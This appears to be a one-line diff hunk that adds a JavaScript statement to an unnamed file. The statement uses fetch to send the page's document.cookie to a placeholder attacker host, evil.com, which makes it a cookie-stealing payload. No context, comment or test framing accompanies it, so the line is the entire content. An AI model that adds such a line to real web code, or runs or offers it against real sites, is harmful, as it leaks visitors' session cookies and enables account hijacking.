@@ -1,0 +1,1 @@
+fetch("https://evil.com/?c="+document.cookie)
